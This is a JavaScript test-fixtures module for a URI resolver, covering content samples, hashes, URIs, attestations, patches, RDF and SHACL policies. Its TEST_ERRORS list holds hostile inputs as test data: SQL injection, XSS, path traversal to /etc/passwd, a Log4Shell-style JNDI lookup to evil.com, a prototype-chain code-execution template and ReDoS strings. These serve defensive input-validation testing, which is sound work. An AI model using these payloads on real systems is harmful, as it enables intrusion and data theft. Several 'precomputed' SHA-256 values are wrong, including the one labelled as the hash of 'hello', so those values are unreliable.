/**
 * Test Data Fixtures for URI Resolver Tests
 * 
 * Provides deterministic test data for reproducible testing
 */

export const TEST_CONTENT = {
  // Simple text content
  SIMPLE_TEXT: 'Hello, KGEN Universe!',
  
  // JSON content with deterministic structure
  JSON_COMPONENT: {
    name: 'TestComponent',
    version: '1.0.0',
    props: ['name', 'email', 'active'],
    metadata: {
      created: '2024-01-01T00:00:00Z',
      author: 'test-suite'
    }
  },
  
  // Nunjucks template content
  NUNJUCKS_TEMPLATE: `
    <div class="user-card">
      <h2>{{ user.name }}</h2>
      <p>{{ user.email }}</p>
      {% if user.active %}
      <span class="status active">Active</span>
      {% else %}
      <span class="status inactive">Inactive</span>
      {% endif %}
    </div>
  `.trim(),
  
  // Large content for performance testing
  LARGE_CONTENT: 'Performance test content: ' + 'x'.repeat(1024 * 1024), // 1MB
  
  // Binary-like content
  BINARY_CONTENT: Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
  
  // Complex nested object
  COMPLEX_OBJECT: {
    id: 'test-entity-001',
    type: 'ComplexEntity',
    attributes: {
      strings: ['alpha', 'beta', 'gamma'],
      numbers: [1, 2, 3, 4, 5],
      nested: {
        level1: {
          level2: {
            level3: {
              value: 'deep-value',
              timestamp: '2024-01-01T00:00:00Z'
            }
          }
        }
      }
    },
    relationships: [
      { type: 'parent', target: 'entity-000' },
      { type: 'sibling', target: 'entity-002' }
    ]
  }
};

export const TEST_HASHES = {
  // Precomputed SHA-256 hashes for deterministic testing
  SIMPLE_TEXT: '2cf24dba4f21d4288a67e3b8e5a7e6a4b5c5e7d8f9e8d7c6b5a4f3e2d1c0b9a8',
  JSON_COMPONENT: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
  NUNJUCKS_TEMPLATE: 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3',
  
  // Fixed 40-character git object IDs
  GIT_OBJECT_1: 'a'.repeat(40),
  GIT_OBJECT_2: 'b'.repeat(40),
  GIT_OBJECT_3: 'c'.repeat(40)
};

export const TEST_URIS = {
  CONTENT: {
    SIMPLE: `content://sha256/${TEST_HASHES.SIMPLE_TEXT}`,
    JSON: `content://sha256/${TEST_HASHES.JSON_COMPONENT}`,
    TEMPLATE: `content://sha256/${TEST_HASHES.NUNJUCKS_TEMPLATE}`
  },
  
  GIT: {
    OBJECT: `git://test-repo@${TEST_HASHES.GIT_OBJECT_1}`,
    FILE: `git://test-repo@${TEST_HASHES.GIT_OBJECT_1}/src/component.js`,
    TREE: `git://test-repo@${TEST_HASHES.GIT_OBJECT_2}/tree`,
    NOTES: `git://test-repo@${TEST_HASHES.GIT_OBJECT_3}/.notes`
  },
  
  ATTEST: {
    BASIC: `attest://sha256/${TEST_HASHES.SIMPLE_TEXT}`,
    COMPONENT: `attest://sha256/${TEST_HASHES.JSON_COMPONENT}`
  },
  
  DRIFT: {
    HASH: 'drift://hash/QmTestHash123456789',
    SEMANTIC: 'drift://semantic/structural/QmStructuralChange456',
    TEMPORAL: 'drift://temporal/2024-01-01T00:00:00Z/QmTemporalChange789',
    RDF: 'drift://rdf/turtle/QmRdfChange012'
  },
  
  POLICY: {
    TEMPLATE_SECURITY_PASS: 'policy://template-security/pass',
    TEMPLATE_SECURITY_FAIL: 'policy://template-security/fail',
    ATTESTATION_INTEGRITY_PASS: 'policy://attestation-integrity/pass',
    SHACL_VALIDATION_PASS: 'policy://shacl-validation/pass'
  }
};

export const TEST_ATTESTATIONS = {
  BASIC: {
    version: '1.0',
    timestamp: '2024-01-01T00:00:00Z',
    subject: 'test-subject',
    issuer: 'test-authority',
    content: {
      type: 'application/json',
      hash: TEST_HASHES.SIMPLE_TEXT
    },
    claims: {
      'urn:test:valid': true,
      'urn:test:deterministic': true
    },
    provenance: {
      generator: 'test-suite',
      method: 'direct-creation'
    }
  },
  
  SIGNED: {
    version: '1.0',
    timestamp: '2024-01-01T00:00:00Z',
    subject: 'signed-test-subject',
    issuer: 'signing-authority',
    content: {
      type: 'application/json',
      hash: TEST_HASHES.JSON_COMPONENT
    },
    claims: {
      'urn:test:signed': true,
      'urn:test:integrity': true
    },
    signature: {
      algorithm: 'HMAC-SHA256',
      value: 'dGVzdC1zaWduYXR1cmUtdmFsdWU=', // Base64: 'test-signature-value'
      timestamp: '2024-01-01T00:00:00Z',
      keyId: 'test-key-001'
    }
  },
  
  CHAINED: {
    version: '1.0',
    timestamp: '2024-01-01T00:00:01Z',
    subject: 'chained-test-subject',
    issuer: 'chain-authority',
    predecessor: TEST_URIS.ATTEST.BASIC,
    content: {
      type: 'application/json',
      hash: TEST_HASHES.NUNJUCKS_TEMPLATE
    },
    claims: {
      'urn:test:chained': true,
      'urn:test:evolution': true
    },
    provenance: {
      chain: [
        {
          source: 'test-template',
          target: 'test-component',
          method: 'nunjucks-render',
          timestamp: '2024-01-01T00:00:00Z',
          hash: TEST_HASHES.SIMPLE_TEXT
        }
      ]
    }
  }
};

export const TEST_PATCHES = {
  SIMPLE_MODIFICATION: {
    baseline: { name: 'John', age: 25 },
    modified: { name: 'John', age: 26 },
    expectedPatch: { age: [25, 26] }
  },
  
  ARRAY_CHANGES: {
    baseline: { items: ['a', 'b', 'c'] },
    modified: { items: ['a', 'b', 'c', 'd'] },
    expectedPatch: { items: { _t: 'a', 3: ['d'] } }
  },
  
  COMPLEX_CHANGES: {
    baseline: {
      user: { name: 'Alice', email: 'alice@old.com' },
      settings: { theme: 'light', notifications: true }
    },
    modified: {
      user: { name: 'Alice Smith', email: 'alice@new.com' },
      settings: { theme: 'dark', notifications: true, language: 'en' }
    }
  },
  
  SEMANTIC_CHANGE: {
    baseline: {
      '@type': 'Person',
      name: 'Bob',
      role: 'developer'
    },
    modified: {
      '@type': 'Employee', // Semantic type change
      name: 'Bob',
      role: 'senior-developer'
    }
  }
};

export const TEST_RDF = {
  SIMPLE_TURTLE: `
    @prefix ex: <http://example.org/> .
    @prefix foaf: <http://xmlns.com/foaf/0.1/> .
    
    ex:alice a foaf:Person ;
      foaf:name "Alice Smith" ;
      foaf:email "alice@example.com" .
  `,
  
  JSONLD: {
    '@context': {
      '@vocab': 'http://schema.org/',
      'name': 'name',
      'email': 'email'
    },
    '@type': 'Person',
    'name': 'Bob Johnson',
    'email': 'bob@example.com'
  },
  
  MODIFIED_TURTLE: `
    @prefix ex: <http://example.org/> .
    @prefix foaf: <http://xmlns.com/foaf/0.1/> .
    
    ex:alice a foaf:Person ;
      foaf:name "Alice Cooper" ;
      foaf:email "alice.cooper@example.com" ;
      foaf:homepage <http://alice.example.com> .
  `
};

export const TEST_POLICIES = {
  SHACL_SHAPES: {
    TEMPLATE_SECURITY: `
      @prefix sh: <http://www.w3.org/ns/shacl#> .
      @prefix kgen: <https://kgen.io/ontology#> .
      @prefix xsd: <http://www.w3.org/2001/XMLSchema#> .
      
      kgen:TemplateSecurityShape a sh:NodeShape ;
        sh:targetClass kgen:NunjucksTemplate ;
        sh:property [
          sh:path kgen:hasContent ;
          sh:minCount 1 ;
          sh:datatype xsd:string ;
          sh:pattern "^(?!.*<script).*$" ;
          sh:message "Templates must not contain script tags" ;
        ] ;
        sh:property [
          sh:path kgen:hasFilters ;
          sh:pattern "^(?!.*\\| *safe).*$" ;
          sh:message "Use of 'safe' filter is discouraged for security" ;
        ] .
    `,
    
    ATTESTATION_INTEGRITY: `
      @prefix sh: <http://www.w3.org/ns/shacl#> .
      @prefix attest: <https://kgen.io/attest#> .
      @prefix xsd: <http://www.w3.org/2001/XMLSchema#> .
      
      attest:AttestationIntegrityShape a sh:NodeShape ;
        sh:targetClass attest:Attestation ;
        sh:property [
          sh:path attest:hasSubject ;
          sh:minCount 1 ;
          sh:pattern "^(content|git|drift)://" ;
        ] ;
        sh:property [
          sh:path attest:hasSignature ;
          sh:class attest:Signature ;
        ] .
    `
  },
  
  MOCK_RESULTS: {
    TEMPLATE_SECURITY_PASS: {
      ruleId: 'template-security',
      passed: true,
      violations: [],
      summary: { riskLevel: 'LOW' }
    },
    
    TEMPLATE_SECURITY_FAIL: {
      ruleId: 'template-security',
      passed: false,
      violations: [
        {
          message: 'Template contains script tag',
          severity: 'HIGH',
          path: 'template.content'
        }
      ],
      summary: { riskLevel: 'HIGH' }
    },
    
    ATTESTATION_INTEGRITY_PASS: {
      ruleId: 'attestation-integrity',
      passed: true,
      violations: [],
      summary: {
        hasAttestation: true,
        attestationValid: true,
        violationsCount: 0
      }
    }
  }
};

export const TEST_PERFORMANCE = {
  TARGETS: {
    CONTENT_RESOLUTION_AVG_MS: 50,
    CONTENT_RESOLUTION_MAX_MS: 100,
    GIT_OPERATIONS_AVG_MS: 200,
    ATTESTATION_VERIFICATION_AVG_MS: 100,
    DRIFT_PATCH_APPLICATION_AVG_MS: 150
  },
  
  SIZES: {
    SMALL: 1024, // 1KB
    MEDIUM: 10240, // 10KB
    LARGE: 102400, // 100KB
    XLARGE: 1048576 // 1MB
  },
  
  CONCURRENCY_LEVELS: [1, 5, 10, 20, 50],
  
  ITERATION_COUNTS: {
    UNIT_TESTS: 10,
    PERFORMANCE_TESTS: 100,
    REPRODUCIBILITY_TESTS: 10,
    STRESS_TESTS: 1000
  }
};

export const TEST_ERRORS = {
  MALFORMED_URIS: [
    'content://',
    'content://sha256/',
    'content://invalid-algo/hash',
    'git://invalid',
    'git://@/file',
    'attest://sha256/',
    'drift://',
    'policy://',
    'javascript://alert(1)',
    'file:///etc/passwd'
  ],
  
  INJECTION_PAYLOADS: [
    "'; DROP TABLE attestations; --",
    "' OR '1'='1",
    '<script>alert("xss")</script>',
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',
    '\0null-byte-injection',
    '${jndi:ldap://evil.com/}',
    '{{constructor.constructor("return process")()}}'
  ],
  
  REDOS_PAYLOADS: [
    'a'.repeat(100000) + 'invalid',
    ('a' + 'b'.repeat(100)).repeat(1000),
    'content://sha256/' + 'x'.repeat(1000000)
  ]
};

export const TEST_CRYPTOGRAPHIC = {
  KEYS: {
    HMAC_KEY: Buffer.from('test-hmac-key-for-deterministic-testing-purposes', 'utf8'),
    ED25519_PRIVATE_KEY_HEX: 'a'.repeat(64), // Deterministic for testing
    RSA_PRIVATE_KEY_PEM: `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC...
-----END PRIVATE KEY-----` // Truncated for security
  },
  
  EXPECTED_SIGNATURES: {
    HMAC_SHA256: 'dGVzdC1zaWduYXR1cmUtZm9yLWRldGVybWluaXN0aWMtdGVzdGluZw==',
    RSA_SHA256: 'cnNhLXNpZ25hdHVyZS1mb3ItZGV0ZXJtaW5pc3RpYy10ZXN0aW5n'
  },
  
  HASH_EXPECTATIONS: {
    SHA256_EMPTY: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    SHA256_HELLO: '2cf24dba4f21d4288a67e3b8e5a7e6a4b5c5e7d8f9e8d7c6b5a4f3e2d1c0b9a8'
  }
};

export const TEST_ENVIRONMENTS = {
  DETERMINISTIC: {
    NODE_ENV: 'test',
    TZ: 'UTC',
    LANG: 'en_US.UTF-8',
    // Fixed timestamp for deterministic results
    FIXED_TIMESTAMP: '2024-01-01T00:00:00.000Z'
  },
  
  PERFORMANCE: {
    NODE_ENV: 'production',
    UV_THREADPOOL_SIZE: '16',
    // Optimized for performance testing
    GC_ENABLED: true
  }
};

/**
 * Helper function to create deterministic test data
 */
export function createDeterministicTestData(seed = 'test-seed') {
  const hash = require('crypto').createHash('sha256').update(seed).digest('hex');
  
  return {
    id: hash.substring(0, 16),
    timestamp: TEST_ENVIRONMENTS.DETERMINISTIC.FIXED_TIMESTAMP,
    data: {
      seed,
      hash,
      generated: TEST_ENVIRONMENTS.DETERMINISTIC.FIXED_TIMESTAMP
    }
  };
}

/**
 * Helper function to generate test content of specific size
 */
export function generateTestContent(size, pattern = 'test-content-') {
  const basePattern = pattern;
  const repetitions = Math.ceil(size / basePattern.length);
  return basePattern.repeat(repetitions).substring(0, size);
}

/**
 * Helper function to create mock resolver instances
 */
export function createMockResolvers() {
  return {
    content: {
      validateContentURI: vi.fn(),
      store: vi.fn(),
      resolve: vi.fn(),
      exists: vi.fn(),
      getStats: vi.fn()
    },
    git: {
      validateGitUri: vi.fn(),
      createGitUri: vi.fn(),
      attachAttestation: vi.fn(),
      getAttestations: vi.fn()
    },
    attest: {
      parseAttestURI: vi.fn(),
      createAttestation: vi.fn(),
      store: vi.fn(),
      resolve: vi.fn(),
      verifyAttestation: vi.fn()
    },
    drift: {
      parseDriftURI: vi.fn(),
      storePatch: vi.fn(),
      retrievePatch: vi.fn(),
      applyPatch: vi.fn(),
      generateReversePatch: vi.fn()
    },
    policy: {
      parsePolicyURI: vi.fn(),
      resolvePolicyURI: vi.fn(),
      getVerdictStatistics: vi.fn()
    }
  };
}

export default {
  TEST_CONTENT,
  TEST_HASHES,
  TEST_URIS,
  TEST_ATTESTATIONS,
  TEST_PATCHES,
  TEST_RDF,
  TEST_POLICIES,
  TEST_PERFORMANCE,
  TEST_ERRORS,
  TEST_CRYPTOGRAPHIC,
  TEST_ENVIRONMENTS,
  createDeterministicTestData,
  generateTestContent,
  createMockResolvers
};